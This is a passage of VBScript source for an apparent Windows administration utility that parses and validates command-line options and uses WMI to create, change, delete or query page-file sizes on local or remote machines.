                        WScript.Echo(L_InvalidHelpUsage_ErrorMessage)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If
                    ' Check if Password is already specified
                    If NOT blnPasswordSpecified Then
                        blnPasswordSpecified = TRUE ' Set Specified Flag to TRUE
                        If NOT component.getArguments(L_Password_Text,strPassword,intArgIter,FALSE) Then
                            component.VBPrintf L_InvalidSyntax_ErrorMessage
                            Call typeMessage(intMainOption)
                            intParseCmdLine = CONST_ERROR
                            Exit Function
                        End If
                        intArgIter = intArgIter + 1
                    Else
                        component.VBPrintf L_InvalidSyntax_ErrorMessage & " " & _
                        L_NotAllowedMoreThanOnce_ErrorMessage , _
                        Array(WScript.Arguments.Item(intArgIter))
                        ' print the appropriate help usage message
                        Call typeMessage(intMainOption)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If

                Case LCase(SUB_OPTION_INTSIZE)
                    ' Check if initsize is given with help usage
                    If intParseCmdLine = CONST_SHOW_USAGE Then
                        WScript.Echo(L_InvalidHelpUsage_ErrorMessage)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If
                    ' Check if initsize is already specified
                    If NOT blnIntSizeSpecified Then
                        blnIntSizeSpecified = TRUE ' Set Specified Flag to TRUE
                        If NOT component.getArguments(L_Intsize_Text,intIntSize,intArgIter,FALSE) Then
                            component.VBPrintf L_InvalidSyntax_ErrorMessage
                            Call typeMessage(intMainOption)
                            intParseCmdLine = CONST_ERROR
                            Exit Function
                        End If
                        intArgIter = intArgIter + 1
                    Else
                        component.VBPrintf L_InvalidSyntax_ErrorMessage & " " & _
                        L_NotAllowedMoreThanOnce_ErrorMessage , _
                        Array(WScript.Arguments.Item(intArgIter))
                        ' print the appropriate help usage message
                        Call typeMessage(intMainOption)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If

                Case LCase(SUB_OPTION_MAXSIZE)
                    ' Check if maxsize is given with help usage
                    If intParseCmdLine = CONST_SHOW_USAGE Then
                        WScript.Echo(L_InvalidHelpUsage_ErrorMessage)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If
                    ' Check if Maxsize is already specified
                    If NOT blnMaxSizeSpecified Then
                        blnMaxSizeSpecified = TRUE ' Set Specified Flag to TRUE
                        If NOT component.getArguments(L_Maxsize_Text,intMaxSize,intArgIter,FALSE) Then
                            component.VBPrintf L_InvalidSyntax_ErrorMessage
                            Call typeMessage(intMainOption)
                            intParseCmdLine = CONST_ERROR
                            Exit Function
                        End If
                        intArgIter = intArgIter + 1
                    Else
                        component.VBPrintf L_InvalidSyntax_ErrorMessage & " " & _
                        L_NotAllowedMoreThanOnce_ErrorMessage , _
                        Array(WScript.Arguments.Item(intArgIter))
                        ' print the appropriate help usage message
                        Call typeMessage(intMainOption)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If

                Case LCase(SUB_OPTION_FORMAT)
                    ' Check if maxsize is given with help usage
                    If intParseCmdLine = CONST_SHOW_USAGE Then
                        WScript.Echo(L_InvalidHelpUsage_ErrorMessage)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If
                    ' Check if format is already specified
                    If NOT blnFormatSpecified Then
                        blnFormatSpecified = TRUE ' Set Specified Flag to TRUE
                        If NOT component.getArguments(L_Format_Text,strFormat,intArgIter,FALSE) Then
                            component.VBPrintf L_InvalidSyntax_ErrorMessage
                            Call typeMessage(intMainOption)
                            intParseCmdLine = CONST_ERROR
                            Exit Function
                        End If
                        intArgIter = intArgIter + 1
                    Else
                        component.VBPrintf L_InvalidSyntax_ErrorMessage & " " & _
                        L_NotAllowedMoreThanOnce_ErrorMessage , _
                        Array(WScript.Arguments.Item(intArgIter))
                        ' print the appropriate help usage message
                        Call typeMessage(intMainOption)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If

                Case LCase(SUB_OPTION_VOLUME)
                    ' Check if volume is given with help usage
                    If intParseCmdLine = CONST_SHOW_USAGE Then
                        WScript.Echo(L_InvalidHelpUsage_ErrorMessage)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If
                    If NOT component.getArguments(L_Volume_Text,strVolName,intArgIter,FALSE) Then
                        component.VBPrintf L_InvalidSyntax_ErrorMessage
                        Call typeMessage(intMainOption)
                        intParseCmdLine = CONST_ERROR
                        Exit Function
                    Else
                        If strVolName = "*" Then
                            objVols.Add LCase(strVolName), -1
                        Else
                            If NOT objVols.Exists(LCase(strVolName)) Then
                                objVols.Add LCase(strVolName), -1
                            End If
                            intVolumes = objVols.Count
                        End If
                    End If
                    intArgIter = intArgIter + 1

                Case Else
                    ' display the invalid param err msg first
                    component.VBPrintf L_InvalidParameter_ErrorMessage, _
                    Array(WScript.arguments.Item(intArgIter))
                    ' then display the 'type ..usage' message
                    Select Case CInt(intMainOption)
                        Case CONST_CHANGE_OPTION
                            component.VBPrintf L_TypeChangeUsage_Message, _
                            Array(UCase(WScript.ScriptName))
                            WScript.Quit(EXIT_INVALID_PARAM)
                        Case CONST_CREATE_OPTION
                            component.VBPrintf L_TypeCreateUsage_Message, _
                            Array(UCase(WScript.ScriptName))
                            WScript.Quit(EXIT_INVALID_PARAM)
                        Case CONST_DELETE_OPTION
                            component.VBPrintf L_TypeDeleteUsage_Message, _
                            Array(UCase(WScript.ScriptName))
                            WScript.Quit(EXIT_INVALID_PARAM)
                        Case CONST_QUERY_OPTION
                            component.VBPrintf L_TypeQueryUsage_Message, _
                            Array(UCase(WScript.ScriptName))
                            WScript.Quit(EXIT_INVALID_PARAM)
                        Case Else
                            component.VBPrintf L_TypeUsage_Message, _
                            Array(UCase(WScript.ScriptName))
                            WScript.Quit(EXIT_INVALID_PARAM)
                    End Select

            End Select

        Else
            ' invalid argument specified
            ' display the invalid param err msg first
            component.VBPrintf L_InvalidParameter_ErrorMessage, _
            Array(WScript.arguments.Item(intArgIter))
            ' then display the 'type ..usage' message
            Select Case CInt(intMainOption)
                Case CONST_CHANGE_OPTION
                    component.VBPrintf L_TypeChangeUsage_Message, _
                    Array(UCase(WScript.ScriptName))
                    WScript.Quit(EXIT_INVALID_PARAM)
                Case CONST_CREATE_OPTION
                    component.VBPrintf L_TypeCreateUsage_Message, _
                    Array(UCase(WScript.ScriptName))
                    WScript.Quit(EXIT_INVALID_PARAM)
                Case CONST_DELETE_OPTION
                    component.VBPrintf L_TypeDeleteUsage_Message, _
                    Array(UCase(WScript.ScriptName))
                    WScript.Quit(EXIT_INVALID_PARAM)
                Case CONST_QUERY_OPTION
                    component.VBPrintf L_TypeQueryUsage_Message, _
                    Array(UCase(WScript.ScriptName))
                    WScript.Quit(EXIT_INVALID_PARAM)
                Case Else
                    component.VBPrintf L_TypeUsage_Message, _
                    Array(UCase(WScript.ScriptName))
                    WScript.Quit(EXIT_INVALID_PARAM)
            End Select

        End If

    Loop

    ' check if the there is any volume(s) specified.
    If objVols.Count = 0 Then
        intVolumes = objVols.Count
    End If

    ' Check if volumes | * is specified along with help 
    If (intVolumes > 0 AND intQCount = 1) Then
        WScript.Echo(L_InvalidHelpUsage_ErrorMessage)
        WScript.Quit(EXIT_INVALID_INPUT)
    End If

    ' Check if two major operations are selected at a time
    If ( intMainOptionNumber > 1 ) Then
        WScript.Echo(L_InvalidSyntax_ErrorMessage)
        component.VBPrintf L_TypeUsage_Message,Array(UCase(WScript.ScriptName))
        WScript.Quit(EXIT_INVALID_INPUT)
    ElseIf (intQcount = 0 AND intmainoption = 0) Then
        intMainOption = CONST_QUERY_OPTION
    End If

    ' check if NO major option(s) is specified, but other switches are specified
    If ( intMainOptionNumber = 0 ) Then
        If  blnIntSizeSpecified  OR _
            blnMaxSizeSpecified  OR _
            blnFormatSpecified   OR _
            blnMachineSpecified  OR _
            blnUserSpecified     OR _
            blnPasswordSpecified OR _
            intVolumes > 0       Then
            WScript.Echo(L_InvalidSyntax_ErrorMessage)
            component.VBPrintf L_TypeUsage_Message, _
            Array(UCase(WScript.ScriptName))
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If

    ' check if format is specified with create option
    If (intMainOption = CONST_CREATE_OPTION) Then
        If blnFormatSpecified Then
            WScript.Echo(L_InvalidSyntax_ErrorMessage)
            component.VBPrintf L_TypeCreateUsage_Message, _
            Array(UCase(WScript.ScriptName))
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If

    ' check if format is specified with change option
    If (intMainOption = CONST_CHANGE_OPTION) Then
        If blnFormatSpecified Then
            WScript.Echo(L_InvalidSyntax_ErrorMessage)
            component.VBPrintf L_TypeChangeUsage_Message, _
            Array(UCase(WScript.ScriptName))
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If

    ' check if /Initsize, /Maxsize, /FO are specified
    If (intMainOption = CONST_DELETE_OPTION) Then
        If (blnIntSizeSpecified OR blnMaxSizeSpecified OR blnFormatSpecified) Then
            WScript.Echo(L_InvalidSyntax_ErrorMessage)
            component.VBPrintf L_TypeDeleteUsage_Message, _
            Array(UCase(WScript.ScriptName))
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If

    ' check if /Initsize, /Maxsize, are specified
    If (intMainOption = CONST_QUERY_OPTION) Then
        If (blnIntSizeSpecified OR blnMaxSizeSpecified) Then
            WScript.Echo(L_InvalidSyntax_ErrorMessage)
            component.VBPrintf L_TypeQueryUsage_Message, _
            Array(UCase(WScript.ScriptName))
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If

End Function

'******************************************************************************
'* Function: ValidateArguments
'*
'* Purpose:  Validates the command line arguments given by the user
'*
'* Input:
'*  [out]    strMachine        machine to configure page files on
'*  [out]    strUserName       user name to connect to the machine
'*  [out]    strPassword       password for the user
'*  [out]    intIntSize        the initial size for the page file
'*  [out]    intMaxSize        the maximum size for the page file
'*  [out]    objVols           the object containing volume names
'*  [out]    strFormat         the query display format
'*  [out]    intMainOption     the main option specified
'*
'* Output:   Returns true if all valid else displays error message and quits
'*           Gets the password from the user if not specified along with User.
'*
'******************************************************************************
Private Function ValidateArguments ( ByRef strMachine,  _
                                     ByRef strUserName, _
                                     ByRef strPassword, _
                                     ByRef intIntSize,  _
                                     ByRef intMaxSize,  _
                                     ByRef objVols,     _
                                     ByRef strFormat,   _
                                     ByRef intMainOption)
    ON ERROR RESUME NEXT
    Err.Clear

    Dim strMatchPattern  ' the pattern to be matched
    Dim intVolumes       ' to count the no.of volumes specified
    Dim arrVolume        ' array to store the volumes specified
    Dim i                ' Loop variable

    ' Initialization
    intVolumes = CInt(objVols.Count)
    arrVolume  = objVols.Keys
    ValidateArguments = TRUE
    i = 0

    ' Check if invalid server name is given
    If NOT IsEmpty(strMachine) Then
        If Trim(strMachine) = vbNullString Then
            WScript.Echo(L_InvalidServerName_ErrorMessage)
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If

    ' Check if invalid user name is given
    If NOT IsEmpty(strUserName) Then
        If Trim(strUserName) = vbNullString Then
            WScript.Echo(L_InvalidUserName_ErrorMessage)
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If

    ' check if user is given without machine OR password
    If ((strUserName <> VBEmpty) AND (strMachine = VBEmpty)) Then
        WScript.Echo L_InvalidServerCredentials_ErrorMessage
        component.VBPrintf L_TypeUsage_Message, _
        Array(UCase(WScript.ScriptName))
        WScript.Quit(EXIT_INVALID_INPUT)
    ' check if password is given without user OR machine
    ElseIf ((strPassword <> VBEmpty) AND (strUserName = VBEmpty))Then
        WScript.Echo L_InvalidUserCredentials_ErrorMessage
        component.VBPrintf L_TypeUsage_Message, _
        Array(UCase(WScript.ScriptName))
        WScript.Quit(EXIT_INVALID_INPUT)
    End If

    ' Check if initial size is specified, validate if it is a poistive number
    If Len(CStr(intIntSize)) > 0 Then
        ' Initsize should be numeric only
        ' chr(46) indicates "." (dot)
        If NOT (IsNumeric(intIntSize) AND InStr(intIntSize,chr(46)) = 0 AND Instr(intIntSize,"-") = 0) Then
            ValidateArguments = FALSE
            WScript.Echo L_InvalidInitSizeValue_ErrorMessage
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If

    ' Check if maximum size is specified, validate if it is a poistive number
    If Len(CStr(intMaxSize)) > 0 Then
        ' Maxsize should be numeric only
        ' chr(46) indicates "." (dot)
        If NOT (IsNumeric(intMaxSize) AND InStr(intMaxSize,chr(46)) = 0 AND Instr(intMaxSize,"-") = 0) Then
            ValidateArguments = FALSE
            WScript.Echo L_InvalidMaxSizeValue_ErrorMessage
            WScript.Quit(EXIT_INVALID_INPUT)
        End If
    End If

    Select Case CInt(intMainOption)

        Case CONST_CHANGE_OPTION

            ' Valid Cases : either (initsize + volume) OR (maxsize + volume) 
            ' OR (initsize + maxsize + volume)

            ' If none of the parameters (initsize or maxsize) is specified
            If (Len(CStr(intIntSize)) = 0 AND Len(CStr(intMaxSize)) = 0) Then
                ValidateArguments = FALSE
                WScript.Echo(L_InvalidSyntax_ErrorMessage & " " & _
                L_NoneoftheSizeSpecified_ErrorMessage)
                component.VBPrintf L_TypeChangeUsage_Message, _
                Array(UCase(WScript.ScriptName))
                WScript.Quit(EXIT_INVALID_INPUT)
            End If

            ' check if the volume is specified
            If (objVols.Count = 0) Then
                ValidateArguments = FALSE
                WScript.Echo(L_InvalidSyntax_ErrorMessage & " " & _
                L_VolumeNameNotSpecified_ErrorMessage)
                component.VBPrintf L_TypeChangeUsage_Message, _
                Array(UCase(WScript.ScriptName))
                WScript.Quit(EXIT_INVALID_INPUT)
            ' check if volume name is valid
            ElseIf isValidDrive(objVols,intMainOption) Then
                ValidateArguments = TRUE
            End If

        Case CONST_CREATE_OPTION

            ' initsize is required
            If ( Len(CStr(intIntSize)) = 0 ) Then
                ValidateArguments = FALSE
                WScript.Echo(L_InvalidSyntax_ErrorMessage & " " & _
                L_InitialSizeNotSpecified_ErrorMessage)
                component.VBPrintf L_TypeCreateUsage_Message, _
                Array(UCase(WScript.ScriptName))
                WScript.Quit(EXIT_INVALID_INPUT)
            End If

            ' maxsize is required
            If ( Len(CStr(intMaxSize)) = 0 ) Then
                ValidateArguments = FALSE
                WScript.Echo(L_InvalidSyntax_ErrorMessage & " " & _
                L_MaximumSizeNotSpecified_ErrorMessage)
                component.VBPrintf L_TypeCreateUsage_Message, _
                Array(UCase(WScript.ScriptName))
                WScript.Quit(EXIT_INVALID_INPUT)
            End If

            ' volume name is required
            If (objVols.Count = 0) Then
                ValidateArguments = FALSE
                WScript.Echo(L_InvalidSyntax_ErrorMessage & " " & _
                L_VolumeNameNotSpecified_ErrorMessage)
                component.VBPrintf L_TypeCreateUsage_Message, _
                Array(UCase(WScript.ScriptName))
                WScript.Quit(EXIT_INVALID_INPUT)
            ' check if volume name is valid
            ElseIf isValidDrive(objVols,intMainOption) Then
                ValidateArguments = TRUE
            End If

        Case CONST_DELETE_OPTION

            ' ONLY volume  is required
            If (objVols.Count = 0) Then
                ValidateArguments = FALSE
                WScript.Echo(L_InvalidSyntax_ErrorMessage & " " & _
                L_VolumeNameNotSpecified_ErrorMessage)
                component.VBPrintf L_TypeDeleteUsage_Message, _
                Array(UCase(WScript.ScriptName))
                WScript.Quit(EXIT_INVALID_INPUT)
            ' check if volume name is valid
            ElseIf isValidDrive(objVols,intMainOption) Then
                ValidateArguments = TRUE
            End If

            ' Wild Card Character * is not allowed for /Delete option
            If (objVols.Exists("*")) Then
                ValidateArguments = FALSE
                objVols.Remove "*"
                WScript.Echo(L_InvalidInput_ErrorMessage)
                WScript.Quit(EXIT_INVALID_INPUT)
            End If

        Case CONST_QUERY_OPTION

            ' check if any format is specified.
            If Len(strFormat) > 0 Then
                ' only table, list and csv display formats allowed
                ' L_PatternFormat_Text contains ^(table|list|csv)$
                If CInt(component.matchPattern(L_PatternFormat_Text, strFormat)) = CONST_NO_MATCHES_FOUND Then
                    component.vbPrintf L_InvalidSyntax_ErrorMessage & " " & _
                    L_InvalidFormat_ErrorMessage, Array(strFormat)
                    component.VBPrintf L_TypeQueryUsage_Message, _
                    Array(UCase(WScript.ScriptName))
                    WScript.Quit(EXIT_INVALID_INPUT)
                End If
            End If

            ' Validation to check if volume names are specified with Query Option:
            If (intVolumes <> 0) Then
                ValidateArguments = FALSE
                WScript.Echo(L_InvalidSyntax_ErrorMessage)
                component.VBPrintf L_TypeQueryUsage_Message, _
                Array(UCase(WScript.ScriptName))
                WScript.Quit(EXIT_INVALID_INPUT)
            End If

        Case Else

            ' if intMainOption has some non-zero value means one operation is selected
            If (intMainOption > 0) Then
                ' -operation & volname together are valid
                ValidateArguments = TRUE
            Else
                ValidateArguments = FALSE
                WScript.Echo(L_InvalidInput_ErrorMessage)
                WScript.Quit(EXIT_INVALID_INPUT)
            End If

    End Select

    ' verify If required credentials given
    If (((NOT IsEmpty(strUserName)) AND (IsEmpty(strMachine))) OR _
        ((NOT IsEmpty(strPassword)) AND (IsEmpty(strUserName))) )Then
        ValidateArguments = FALSE
        WScript.Echo (L_InvalidCredentials_ErrorMessage)
        WScript.Quit(EXIT_INVALID_INPUT)
    End If

    ' check if the machine name is specified using "\\" (UNC format)
    If Left(strMachine,2) = UNC_FORMAT_SERVERNAME_PREFIX Then
        If Len(strMachine) = 2 Then
            WScript.Echo L_InvalidInput_ErrorMessage
            WScript.Quit(EXIT_UNEXPECTED)
        End If
        ' remove the "\\" from the front
        strMachine = Mid(strMachine,3,Len(strMachine))
    End If

    ' If password not specified with the user name, Then get it
    If ((NOT IsEmpty(strUserName)) AND (IsEmpty(strPassword))) Then
        strPassword = component.getPassword()
    End If

End Function

'******************************************************************************
'* Function: isValidDrive
'*
'* Purpose:  To check if the specified volume is valid or not
'*
'* Input:
'*  [in]     objVols            object that store the volumes specified
'*  [in]     intMainOption      the main option specified
'*
'* Output:   Returns TRUE or FALSE
'*
'******************************************************************************

Function isValidDrive(ByRef objVols,ByVal intMainOption)

    ON ERROR RESUME NEXT
    Err.Clear

    Dim intVolumes       ' to count the no.of volumes specified
    Dim arrVolume        ' array to store the volumes specified
    Dim i                ' Loop variable

    ' Initialization
    intVolumes = CInt(objVols.Count)
    arrVolume  = objVols.Keys
    isValidDrive = FALSE
    i = 0

    ' Check if the drive name is in correct Format [c-z]: or [C-Z]:
    ' This has to be checked for each Drive specified - Do While Loop

    Do While (i < intVolumes)
        ' Volumes specified are valid for all option except Query
        If intMainOption <> CONST_QUERY_OPTION Then
            ' Valid volume is either '*' OR a letter followed by a colon (total length = 2)
            If ((Len(arrVolume(i)) = 2) AND (InStr(arrVolume(i),chr(58)) = 2) OR arrVolume(i) = "*") Then
                ' check if the volume name specified is in the format ^([c-zC-Z]:|\*)$
                If CInt(component.matchPattern(L_VolumePatternFormat_Text,arrVolume(i))) = CONST_NO_MATCHES_FOUND Then
                    ' Invalid Volume Names or junk data is specified
                    component.VBPrintf L_InvalidVolumeName_ErrorMessage, _
                    Array(arrVolume(i))
                    isValidDrive = FALSE
                    ' remove the INVALID drive(s)
                    objVols.Remove arrVolume(i)
                End If
            Else
                isValidDrive = FALSE
                component.VBPrintf L_InvalidVolumeName_ErrorMessage, _
                Array(arrVolume(i))
                objVols.Remove arrVolume(i)
            End If
            ' check the number of valid drives specified
            If objVols.Count = 0 Then
                WScript.Quit(EXIT_INVALID_INPUT)
            End If
        Else
            WScript.Echo(L_InvalidInput_ErrorMessage)
            WScript.Quit (EXIT_INVALID_INPUT)
        End If
        isValidDrive = isValidDrive OR TRUE
        i = i + 1
    Loop

End Function

'******************************************************************************
'* Sub:     ProcessChange
'*
'* Purpose: Processes the /Change option and displays the changed
'*          details of the page file
'*
'* Input:
'*  [in]    strMachine         machine to configure page files on
'*  [in]    strUserName        user name to connect to the machine
'*  [in]    strPassword        password for the user
'*  [in]    intIntSize         the initial size for the page file
'*  [in]    intMaxSize         the maximum size for the page file
'*  [in]    objVols            the object containing volume names
'*
'* Output:  Displays error message and quits if connection fails
'*
'******************************************************************************
Private Sub ProcessChange( ByVal strMachine,  _
                           ByVal strUserName, _
                           ByVal strPassword, _
                           ByVal intIntSize,  _
                           ByVal intMaxSize,  _
                           ByVal objVols      )

    ON ERROR RESUME NEXT
    Err.Clear

    Dim intOldInitialSize     ' to store the old intial size
    Dim intOldMaximumSize     ' to store the old maximum size
    Dim arrVolume             ' to store all the volumes specified
    Dim intVolumes            ' to store the no.of volumes specified
    Dim strQuery              ' to store the query for pagefiles
    Dim strQueryDisk          ' to store the query for disk
    Dim strQueryComp          ' to store the query for computersystem
    Dim objService            ' service object
    Dim objInstance           ' instance object
    Dim objInst               ' instance object
    Dim objEnumerator         ' collection set for query results
    Dim objEnumforDisk        ' collection set for query results
    Dim objEnum               ' collection set for query results
    Dim blnBothSpecified      ' flag to check if both initsize & maxsize are specified
    Dim blnSuccessMsg         ' flag to check if a SUCCESS message is generated
    Dim intFreeSpace          ' to store total free space
    Dim intFreeDiskSpace      ' to store free disk space
    Dim intCurrentSize        ' to store the current pagefile size
    Dim intDiskSize           ' to store the disk size for the specified disk
    Dim intMemSize            ' to store physical memory size
    Dim intCrashDump          ' to store the current crash dump setting value
    Dim strReply              ' to store the user reply
    Dim strDriveName          ' to store the drive name
    Dim strHostName           ' to store the host name
    Dim intMaxSizeUB          ' to store the upper bound for maximum size
    Dim i                     ' loop variable

    ' Establish a connection with the server.
    If NOT component.wmiConnect(CONST_NAMESPACE_CIMV2 , _
                      strUserName , _
                      strPassword , _
                      strMachine  , _
                      blnLocalConnection, _
                      objService  ) Then
        WScript.Echo(L_HintCheckConnection_Message)
        WScript.Quit(EXIT_METHOD_FAIL)
    End If

    ' Initialize variables
    i = 0
    intFreeSpace      = 0
    intFreeDiskSpace  = 0
    intCurrentSize    = 0
    blnBothSpecified  = FALSE
    blnSuccessMsg     = FALSE
    intMaxSizeUB      = 0
    strQuery          = "Select * From " & CLASS_PAGE_FILE_SETTING

    If (objVols.Exists("*")) Then
        Set objEnumerator = objService.ExecQuery(strQuery, "WQL", 0, null)
        For each objInstance in objEnumerator
            strDriveName = Mid(objInstance.Name,1,2)
            If NOT objVols.Exists (LCase(strDriveName)) Then
                objVols.add LCase(strDriveName), -1
            End If
        Next
        objVols.remove "*"
    End If

    intVolumes = objVols.Count
    arrVolume  = objVols.keys

    ' get the host Name - used to get Crash Dump Settings
    strQueryComp = "Select * From " & CLASS_COMPUTER_SYSTEM
    Set objEnum = objService.ExecQuery(strQueryComp, "WQL", 0, null)
    ' check for any errors
    If Err.Number Then
        Err.Clear
        WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
        WScript.Quit(EXIT_QUERY_FAIL)
    End If

    For each objInst in objEnum
        If NOT ISEmpty(objInst.Name) Then
            strHostName = objInst.Name
        Else
            WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
            WScript.Quit(EXIT_QUERY_FAIL)
        End If
    Next

    ' check if initsize and maxsize both are specified
    If (Len(intIntSize) > 0 AND Len(intMaxSize) > 0) Then
        blnBothSpecified = TRUE
    End If

    ' check if no page files exist on the system.
    strQuery = "Select * From " & CLASS_PAGE_FILE_SETTING
    Set objEnumerator = objService.ExecQuery(strQuery, "WQL", 0, null)
    If (objEnumerator.Count = 0) Then
        WScript.Echo(L_NoPageFiles_Message)
        WScript.Quit(EXIT_UNEXPECTED)
    End If

    ' release the object for re-use.
    Set objEnumerator = nothing

    Do While( i < intVolumes )
        ' check if its a valid drive/volume - check from Win32_LogicalDisk
        strQueryDisk = "Select * From " & CLASS_LOGICAL_DISK & _
        " where DriveType = " & DRIVE_TYPE & " and DeviceID = '" & arrVolume(i) & "'"
        Set objEnumforDisk = objService.ExecQuery(strQueryDisk, "WQL", 0, null)
        If objEnumforDisk.Count > 0 Then
            strQuery = "Select * From " & CLASS_PAGE_FILE_SETTING
            strQuery = strQuery & " where NAME = '" & arrVolume(i) & _
            "\" & PAGEFILE_DOT_SYS & "'"
            Set objEnumerator = objService.ExecQuery(strQuery, "WQL", 0, null)
            ' check for any errors
            If Err.Number Then
                Err.Clear
                WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
                WScript.Quit(EXIT_QUERY_FAIL)
            End If

            ' check if a page file exists on the specified volume
            If (objEnumerator.Count > 0) Then
                For each objInstance in objEnumerator
                    ' check for system managed pagefiles
                    If (objInstance.InitialSize = 0 AND objInstance.MaximumSize = 0) Then
                        component.VBPrintf L_SystemManagedSize_ErrorMessage, _
                        Array(UCase(arrVolume(i)))
                    Else
                        strDriveName = Mid(objInstance.Name,1,2)
                        If NOT blnBothSpecified Then
                            ' check if initsize is given
                            If (intIntSize > 0) Then
                                ' Check if initsize is greater than 2 MB
                                If CLng(intIntSize) >= CLng(INITIAL_SIZE_LB) Then
                                    ' check for overflows
                                    If Err.Number Then
                                        Err.Clear
                                        ' get the upper bound allowed for maximum size
                                        intMaxSizeUB = getMaxSizeUB(objService)
                                        component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                        Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                        WScript.Quit(EXIT_INVALID_INPUT)
                                    End If
                                    ' get the drive name first
                                    strDriveName = Mid(objInstance.Name,1,2)
                                    ' get the free space available on the specified disk
                                    intFreeDiskSpace = getFreeSpaceOnDisk(strDriveName,objService)
                                    ' get the current pagefile size
                                    intCurrentSize = getCurrentPageFileSize(objService,objInstance)
                                    ' get the total free space
                                    If Len(intCurrentSize) > 0 Then
                                        intFreeSpace = intFreeDiskSpace + intCurrentSize
                                    Else
                                        WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
                                        WScript.Quit(EXIT_QUERY_FAIL)
                                    End If
                                    ' Check if it is greater than free disk space
                                    If CLng(intIntSize) > CLng(intFreeSpace) Then
                                        ' check for overflows
                                        If Err.Number Then
                                            Err.Clear
                                            ' get the upper bound allowed for maximum size
                                            intMaxSizeUB = getMaxSizeUB(objService)
                                            component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                            Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                            WScript.Quit(EXIT_INVALID_INPUT)
                                        End If
                                        WScript.Echo(NotEnoughSpaceErrorMessage)
                                        WScript.Quit(EXIT_INVALID_INPUT)
                                    Else
                                        If CLng(intIntSize) > CLng(intFreeSpace) - 5 Then
                                            ' check for overflows
                                            If Err.Number Then
                                                Err.Clear
                                                WScript.Echo(L_InvalidInput_ErrorMessage)
                                                WScript.Quit(EXIT_INVALID_INPUT)
                                            End If
                                            WScript.Echo(AtLeastFiveMBErrorMessage)
                                            WScript.Quit(EXIT_INVALID_INPUT)
                                        Else
                                            ' only one of initsize, maxsize is specified
                                            ' check if the specified initsize is less than existing maxsize
                                            If (CInt(intIntSize) <= objInstance.MaximumSize) Then
                                                ' get the crash dump setting value
                                                intCrashDump = GetCrashDumpSetting(strUserName,strPassword,strMachine)
                                                ' get the Physical Memory Size
                                                intMemSize = GetPhysicalMemorySize(strHostName,objService)
                                                ' If the user has selected "yes" for the warning message
                                                If isCrashDumpValueSet(intCrashDump,intIntSize,intMemSize,arrVolume(i)) Then
                                                    ' Check if initsize is same as the present value
                                                    If (CInt(intIntSize) <> objInstance.InitialSize) Then
                                                        ' store the old initsize value
                                                        intOldInitialSize = objInstance.InitialSize
                                                        ' set the new initsize
                                                        objInstance.InitialSize = intIntSize
                                                        objInstance.Put_(CONST_WBEM_FLAG)
                                                        If Err.Number Then
                                                            Err.Clear
                                                            WScript.Echo(L_UpdateFailed_ErrorMessage)
                                                            WScript.Quit(EXIT_INVALID_INPUT)
                                                        End If
                                                        component.VBPrintf ChangeIntSuccessMessage, _
                                                        Array(UCase(arrVolume(i)),CInt(intOldInitialSize),CInt(intIntSize))
                                                        blnSuccessMsg = TRUE
                                                    Else
                                                        component.VBPrintf ChangeIntSkippingMessage, Array(UCase(arrVolume(i)))
                                                    End If
                                                End If
                                            Else
                                                ' get the upper bound allowed for maximum size
                                                intMaxSizeUB = getMaxSizeUB(objService)
                                                component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                                Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                            End If
                                        End If
                                    End If
                                Else
                                    ' get the upper bound allowed for maximum size
                                    intMaxSizeUB = getMaxSizeUB(objService)
                                    component.VBPrintf InitialSizeRangeErrorMessage, _
                                    Array(intMaxSizeUB)
                                    WScript.Quit(EXIT_INVALID_INPUT)
                                End If
                            Else
                                ' Check if initsize specified as 0
                                If Len(intIntSize) > 0 Then
                                    ' get the upper bound allowed for maximum size
                                    intMaxSizeUB = getMaxSizeUB(objService)
                                    component.VBPrintf InitialSizeRangeErrorMessage, _
                                    Array(intMaxSizeUB)
                                    WScript.Quit(EXIT_INVALID_INPUT)
                                End If
                            End If ' initsize checked

                            ' check if maxsize is given
                            If (intMaxSize > 0) Then
                                ' get the free space available on the specified disk
                                intFreeDiskSpace = getFreeSpaceOnDisk(strDriveName,objService)
                                ' get the current pagefile size
                                intCurrentSize = getCurrentPageFileSize(objService,objInstance)
                                ' get the total free space
                                If Len(intCurrentSize) > 0 Then
                                    intFreeSpace = intFreeDiskSpace + intCurrentSize
                                Else
                                    WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
                                    WScript.Quit(EXIT_QUERY_FAIL)
                                End If

                                ' Get the Disk Size for the specified drive
                                intDiskSize = GetDiskSize(arrVolume(i),objService)
                                ' check if maxsize is more than initsize
                                If (CLng(intMaxSize) > CLng(intDiskSize)) Then
                                    ' check for overflows
                                    If Err.Number Then
                                        Err.Clear
                                        ' get the upper bound allowed for maximum size
                                        intMaxSizeUB = getMaxSizeUB(objService)
                                        component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                        Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                        WScript.Quit(EXIT_INVALID_INPUT)
                                    End If
                                    component.VBPrintf DiskTooSmallErrorMessage, Array(UCase(arrVolume(i)))
                                Else
                                    If (CLng(intMaxSize) > CLng(intFreeSpace)) Then
                                        ' check for overflows
